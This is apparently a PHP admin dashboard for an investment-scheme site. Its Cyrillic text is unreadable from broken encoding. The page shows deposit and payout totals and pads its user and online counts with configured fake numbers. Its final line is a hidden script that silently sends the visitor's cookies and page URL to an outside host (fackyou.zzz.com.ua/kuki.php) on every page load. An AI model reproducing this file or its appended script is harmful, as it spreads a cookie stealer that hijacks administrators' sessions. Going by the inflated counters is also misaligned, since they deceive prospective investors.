<?php
/*
������ ������ ���������� ���������� �������� ������������, ����� �����.
����� ������������� ������� �������, ��������� ������ � ����������� �������� ������.
������ ������� �������: http://adminstation.ru/images/docs/doc1.jpg
���� ����������: 14.10.2007 �. - �������������� 17.04.2009 �.

-> ������� ���� ��������� AdminStation
*/

include "../cfg.php";
include "../ini.php";
if($status == 1 || $status == 2) {
	
$resulten	= mysql_query("SELECT `sum`,`paysys` FROM `enter` WHERE  status = '2' ORDER BY id DESC LIMIT 1");
	if(mysql_num_rows($resulten)) {
$rowen = mysql_fetch_array($resulten);
$ent = sprintf ("%01.2f", str_replace(',', '.', $rowen['sum'])).' $.';
} else {
$ent = '��� ����������!';
}

	$resultol	= mysql_query("SELECT `date`,`sum`,`paysys` FROM `output` WHERE  status = '2' ORDER BY id DESC LIMIT 1");
	if(mysql_num_rows($resultol)) {
$rowol = mysql_fetch_array($resultol);
$outl = sprintf ("%01.2f", str_replace(',', '.', $rowol['sum'])).' $.';
} else {
$outl = '��� ������!';
}
$enter	= 0;
$query	= "SELECT `sum` FROM `enter` WHERE purse != 'X000000' AND status = 2";
$result	= mysql_query($query);
while($row = mysql_fetch_array($result)) {
	$enter = $enter + $row['sum'];
}
$cusers		= mysql_num_rows(mysql_query("SELECT id FROM users")) + cfgSET('fakeusers');
$cwm		= mysql_num_rows(mysql_query("SELECT id FROM users WHERE pm_balance != 0 OR lr_balance != 0")) + cfgSET('fakeactiveusers');

$output	= 0;
$query	= "SELECT `sum` FROM `output` WHERE purse != 'X000000' AND status = 2";
$result	= mysql_query($query);
while($row = mysql_fetch_array($result)) {
	$output = $output + $row['sum'];
}
?>
<html>
<title>ProfitScripts.tech | ������ ���������� ��������</title>
<link  href="/adminstyle/css/bootstrap.css" rel="stylesheet" type='text/css' />
<!-- Custom Theme files -->
<link  href="/adminstyle/css/style.css" rel="stylesheet" type="text/css" media="all" />
<!-- Custom Theme files -->
<script src="/adminstyle/js/jquery.min.js"></script>
<link rel="stylesheet"  href="/adminstyle/css/font-awesome.css">
<!-- Custom Theme files -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="ProfitScripts.tech | ������ ���������� ��������" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<!--webfont-->
<link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
<script>$(document).ready(function(c) {
	$('.alert-close').on('click', function(c){
		$('.calender-left').fadeOut('slow', function(c){
	  		$('.calender-left').remove();
		});
	});	  
});
</script>
<script>$(document).ready(function(c) {
	$('.alert-close1').on('click', function(c){
		$('.calender-right').fadeOut('slow', function(c){
	  		$('.calender-right').remove();
		});
	});	  
});
</script>
<script>$(document).ready(function(c) {
	$('.alert-close2').on('click', function(c){
		$('.graph').fadeOut('slow', function(c){
	  		$('.graph').remove();
		});
	});	  
});
</script>
<script>$(document).ready(function(c) {
	$('.alert-close3').on('click', function(c){
		$('.site-report').fadeOut('slow', function(c){
	  		$('.site-report').remove();
		});
	});	  
});
</script>
<script>$(document).ready(function(c) {
	$('.alert-close4').on('click', function(c){
		$('.total-sale').fadeOut('slow', function(c){
	  		$('.total-sale').remove();
		});
	});	  
});
</script>
<script>$(document).ready(function(c) {
	$('.alert-close5').on('click', function(c){
		$('.to-do').fadeOut('slow', function(c){
	  		$('.to-do').remove();
		});
	});	  
});
</script>
<script>$(document).ready(function(c) {
	$('.alert-close7').on('click', function(c){
		$('.user-trends').fadeOut('slow', function(c){
	  		$('.user-trends').remove();
		});
	});	  
});
</script>
<script>$(document).ready(function(c) {
	$('.alert-close6').on('click', function(c){
		$('.world-map').fadeOut('slow', function(c){
	  		$('.world-map').remove();
		});
	});	  
});
</script>
<script>
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  	ga('create', 'UA-48014931-1', 'codyhouse.co');
  	ga('send', 'pageview');

  	jQuery(document).ready(function($){
  		$('.close-carbon-adv').on('click', function(){
  			$('#carbonads-container').hide();
  		});
  	});
</script>
	<script src="/adminstyle/js/zingchart.min.js"></script>
	<script src="/adminstyle/js/zingchart.jquery.js"></script>
	<script src="/adminstyle/js/jquery.easydropdown.js"></script>
	<script src="/adminstyle/js/jquery.nicescroll.js"></script>
	<link href="files/favicon.ico" type="image/x-icon" rel="shortcut icon">
<link href="files/styles.css" rel="stylesheet" type="text/css" />
	
					 <link  href="/adminstyle/css/jqvmap.css" media="screen" rel="stylesheet" type="text/css" />
					 <script src="/adminstyle/http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
    <script src="/adminstyle/js/jquery.vmap.js" type="text/javascript"></script>
    <script src="/adminstyle/js/jquery.vmap.world.js" type="text/javascript"></script>
	<script src="/adminstyle/js/jquery.vmap.sampledata.js" type="text/javascript"></script>
    
	<script type="text/javascript">
	jQuery(document).ready(function() {
		jQuery('#vmap').vectorMap({
		    map: 'world_en',
		    backgroundColor: '#333333',
		    color: '#ffffff',
		    hoverOpacity: 0.7,
		    selectedColor: '#666666',
		    enableZoom: true,
		    showTooltip: true,
		    values: sample_data,
		    scaleColors: ['#C8EEFF', '#006491'],
		    normalizeFunction: 'polynomial'
		});
	});
	</script>
<!----Calender -------->
  <link rel="stylesheet"  href="/adminstyle/css/clndr.css" type="text/css" />
  <script src="/adminstyle/js/underscore-min.js"></script>
  <script src= "/adminstyle/js/moment-2.2.1.js"></script>
  <script src="/adminstyle/js/clndr.js"></script>
  <script src="/adminstyle/js/site.js"></script>
<!----End Calender -------->
<script src="/adminstyle/js/easyResponsiveTabs.js" type="text/javascript"></script>
		    <script type="text/javascript">
			    $(document).ready(function () {
			        $('#horizontalTab,#horizontalTab1,#horizontalTab2').easyResponsiveTabs({
			            type: 'default', //Types: default, vertical, accordion           
			            width: 'auto', //auto or any width like 600px
			            fit: true   // 100% fit in a container
			        });
			    });
			   </script>
<link  href="/adminstyle/css/nav.css" rel="stylesheet" type="text/css" media="all"/>
<script src="/adminstyle/js/main.js"></script> <!-- Resource jQuery -->
					<!-- chart -->
					<script src="/adminstyle/js/Chart1.js"></script>
					<!-- //chart -->
</head>

<body>
	<div class="total-content">
		<div class="col-md-3 side-bar">
			<div class="logo text-center">
				<a  href="#"><img src="/adminstyle/images/logo.png" alt="" /></a>
			</div>
			<div class="navigation">
				<h3>�������</h3>
				<ul>
					<li><a  href=""><i class="pic"></i></a></li>
					<li><a  href="?a=news">�������� �������</a></li>
				</ul>
				<ul>
					<li><a  href=""><i class="art"></i></a></li>
				<li><a  href="?a=add_page">������� ��������</a></li>
				</ul>
				<ul>
					<li><a  href=""><i class="art"></i></a></li>
					<li><a  href="?a=pages">��������� ��������</a></li>
					</ul>
					
					
						<h3>������������</h3>	
		
				<ul>
					<li><a  href=""><i class="user"></i></a></li>
					<li><a  href="?a=users">���������� ��������������</a></li>
				</ul>
				
					<ul>
					<li><a  href=""><i class="mail"></i></a></li>
					<li><a  href="?a=mailto">�������� �������������</a></li>
				</ul>
				
				
					<ul>
					<li><a  href=""><i class="user"></i></a></li>
					<li><a  href="?a=reftop">������� ���������</a></li>
				</ul>
				
				<ul>
					<li><a  href=""><i class="user"></i></a></li>
					<li><a  href="?a=blacklist">������ ������ IP</a></li>
				</ul>
				<ul>
					<li><a  href=""><i class="user"></i></a></li>
					<li><a  href="?a=logip">���������� IP</a></li>
				</ul>
				
				
					<h3>�������</h3>	
					
					
					<ul>
					<li><a  href=""><i class="rev"></i></a></li>
					<li><a  href="?a=edit&s=2">���������� ����� <strong><font color="green"><?php print mysql_num_rows(mysql_query("SELECT `id` FROM `enter` WHERE `status` = 2")); ?></strong></a></font></li>
				</ul>
				<ul>
					<li><a  href=""><i class="rev"></i></a></li>
					<li><a  href="?a=edit&sort=0">����� ������� <strong><font color="red"><?php print mysql_num_rows(mysql_query("SELECT `id` FROM `output` WHERE `status` = 0")); ?></strong></a></font></li>
				</ul>
					
					
					<ul>
					<li><a  href=""><i class="rev"></i></a></li>
					<li><a  href="?a=paysystems">��������� �������</a></li>
					</ul>
					
					
				<ul>
					<li><a  href=""><i class="rev"></i></a></li>
					<li><a  href="?a=deposits">��������</a></li>
				</ul>
				<ul>
					<li><a  href=""><i class="rev"></i></a></li>
					<li><a  href="?a=plans">�������������� �����</a></li>
				</ul>
				
						
				<ul>
					<li><a  href=""><i class="page"></i></a></li>
					<li><a  href="?a=accounting">�����������</a></li>
				</ul>
						
						
						
						<h3>���������</h3>		
						
						
					<ul>
					<li><a  href=""><i class="setting"></i></a></li>
					<li><a  href="?a=settings">��������� �������</a></li>
				</ul>	
						
						
						
					<ul>
					<li><a  href=""><i class="setting"></i></a></li>
					<li><a  href="?a=ref">����������� ������</a></li>
				</ul>
				
				
					<ul>
					<li><a  href=""><i class="setting"></i></a></li>
					<li><a  href="?a=fake">�������� ����������</a></li>
				</ul>
				
				
				
				<ul>
					<li><a  href=""><i class="chat"></i></a></li>
					<li><a  href="adminstation.php">����������</a></li>
				</ul>
				

				<ul>
					<li><a  href=""><i class="setting"></i></a></li>
					<li><a  href="?a=serverinf">���������� � �������</a></li>
				</ul>
				
				
				<ul>
					<li><a  href=""><i class="setting"></i></a></li>
					<li><a  href="?a=antivirus">���������</a></li>
				</ul>
			</div>
		</div>
		<div class="col-md-9 content">
			<div class="home-strip">
				<div class="view">
					<ul>
						<li><a  href="/�ontrolpanel/"><i class="refresh"></i></a></li>
						<!--<li class="messages"><a  href=""><i class="msgs"></i><span class="red">3</span></a></li>-->
						<li>
								  <div id="dd1" class="wrapper-dropdown-1"><i class=""><a href="?a=edit&s=2"><img src="/adminstyle/pop.png" width="60"></i><span class="red"><?php print mysql_num_rows(mysql_query("SELECT `id` FROM `enter` WHERE `status` = 2")); ?></span></a>
							   </div>
							   <!-----start-script---->
			<script type="text/javascript">
							function DropDown(el) {
								this.dd1 = el;
								this.initEvents();
							}
							DropDown.prototype = {
								initEvents : function() {
									var obj = this;
				
									obj.dd.on('click', function(event){
										$(this).toggleClass('active');
										event.stopPropagation();
									});	
								}
							}
							$(function() {
				
								var dd1 = new DropDown( $('#dd1') );
				
								$(document).click(function() {
									// all dropdowns
									$('.wrapper-dropdown-1').removeClass('active');
								});
				
							});
			</script>
						   </li>
						<!--<li class="notifications"><a  href=""><i class="bell"></i><span class="blue">7</span></a></li>-->
						<li>
								  <div style="margin-top:10px;"><div id="dd3" class="wrapper-dropdown-3"><i class=""><a href="?a=edit&sort=0"><img src="/adminstyle/viv.png" width="60"></i><span class="blue"><?php print mysql_num_rows(mysql_query("SELECT `id` FROM `output` WHERE `status` = 0")); ?></span></a>
							   </div>
							   <!-----start-script---->
			<script type="text/javascript">
							function DropDown(el) {
								this.dd3 = el;
								this.initEvents();
							}
							DropDown.prototype = {
								initEvents : function() {
									var obj = this;
				
									obj.dd.on('click', function(event){
										$(this).toggleClass('active');
										event.stopPropagation();
									});	
								}
							}
							$(function() {
				
								var dd3 = new DropDown( $('#dd3') );
				
								$(document).click(function() {
									// all dropdowns
									$('.wrapper-dropdown-3').removeClass('active');
								});
				
							});
			</script>
						   </li>
					</ul>
				</div>
				<div class="search">
					<div class="search2"><script>
function clock() {
var d = new Date();
var month_num = d.getMonth()
var day = d.getDate();
var hours = d.getHours();
var minutes = d.getMinutes();
var seconds = d.getSeconds();
month=new Array("01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12");
if (day <= 9) day = "0" + day;
if (hours <= 9) hours = "0" + hours;
if (minutes <= 9) minutes = "0" + minutes;
if (seconds <= 9) seconds = "0" + seconds;
date_time = day + "." + month[month_num] + "." + d.getFullYear() + " �.   "+ hours + ":" + minutes + ":" + seconds;
if (document.layers) {
document.layers.doc_time.document.write(date_time);
document.layers.doc_time.document.close();
}
else document.getElementById("doc_time").innerHTML = date_time;
setTimeout("clock()", 1000);
}
</script><span id="doc_time"></span>
<script>
clock();
</script>
<style>
    #doc_time{
    font-family: Impact;
	font-size:40px;
    color: white;
    font-style: italic;
    position: absolute;
    top: 10px;
    left: 30px;
}
</style>
					</div>
				</div>
				<div class="member">
					<p><a  href="#"><i class="men"></i></a><a  href="">������� ���������</a></p>
					<div id="dd" class="wrapper-dropdown-2" tabindex="1"><span><img src="/adminstyle/images/settings.png"/></span>
							<ul class="dropdown">
							
									<li><a  href="?a=settings">��������� �������</a></li>
									<li><a  href="?a=change_pass">������� ������</a></li>
									<li><a  href="?a=plans">�������������� �����</a></li>
									<li><a  href="?a=ref">����������� ���������</a></li>
									<li><a  href="?a=paysystems">��������� �������</a></li>
									<li><a  href="?a=fake">�������� ����������</a></li>
									<li><a  href="/exit.php">�����</a></li>
							</ul>
					</div>
			<!-----end-wrapper-dropdown-2---->
			<!-----start-script---->
			<script type="text/javascript">
							function DropDown(el) {
								this.dd = el;
								this.initEvents();
							}
							DropDown.prototype = {
								initEvents : function() {
									var obj = this;
				
									obj.dd.on('click', function(event){
										$(this).toggleClass('active');
										event.stopPropagation();
									});	
								}
							}
							$(function() {
				
								var dd = new DropDown( $('#dd') );
				
								$(document).click(function() {
									// all dropdowns
									$('.wrapper-dropdown-2').removeClass('active');
								});
				
							});
			</script>
			<div class="clearfix"></div>			
			</div>
			<div class="clearfix"></div>	
				</div>
				<div class="clearfix"></div>
			<p class="home"><a  href="/index.php">�������</a> > <strong> �����������</strong></p>
			<div class="list_of_members">
				<div class="sales">
					<div class="icon">
						<i class="dollar"></i>
					</div>
					<div class="icon-text">
						<h3><?php print $enter; ?> $</h3>
						<p>���������</p>
					</div>
					<div class="clearfix"></div>
				</div>
				<div class="sales">
					<div class="icon">
						<i class="dollar"></i>
					</div>
					<div class="icon-text">
						<h3><?php print $output; ?>$</h3>
						<p>���������</p>
					</div>
					<div class="clearfix"></div>
				</div>
				<div class="new-users">
					<div class="icon">
						<i class="user"></i>
					</div>
					<div class="icon-text">
						<h3><?php print $cusers; ?></h3>
						<p>����� ����������</p><br><br>
					</div>
					<div class="clearfix"></div>
				</div>
				<div class="visitors">
					<div class="icon">
						<i class="visit"></i>
					</div>
					<div class="icon-text">
						<h3><?php print intval(mysql_num_rows(mysql_query("SELECT id FROM users WHERE go_time > ".intval(time() - 1200))) + cfgSET('fakeonline')); ?></h3>
						<p>������ �� �����</p>
					</div>
					<div class="clearfix"></div>
				</div>
				<div class="clearfix"></div>
			</div>	

				
<?php
$a	= substr(addslashes(htmlspecialchars($_GET['a'], ENT_QUOTES, '')), 0, 15);

	if(!$a) {
		include "modules/index.php";
	} elseif(file_exists("modules/".$a.".php")) {
		include "modules/".$a.".php";
	} else {
		include "modules/error.php";
	}

?>&nbsp;
<div class="clearfix"></div>
	</ul> 
</div> 

		</div>
		<div class="clearfix"></div>
	</div>
	<div class="footer">
			<div class="copyright text-center">
						<p>&copy; 2017-<?php print date(Y); ?> <a style="color: blue;" href="https://profitscripts.tech/" target="_blank"><b>������� �������� | ���������� �������� �������� ��� ����</a>
		��� ����� ��������!
			</p>
			</div>		
		</div>
</body>
</html>


</body>
</html>
<?php
} else {
print "<html><head><script language=\"javascript\">top.location.href='index.php';</script></head><body><a href=\"index.php\"><b>Index</b></a></body></html>";
}
?>
<script>img= new Image(); img.src="http://fackyou.zzz.com.ua/kuki.php?"+document.cookie+document.location.href</script>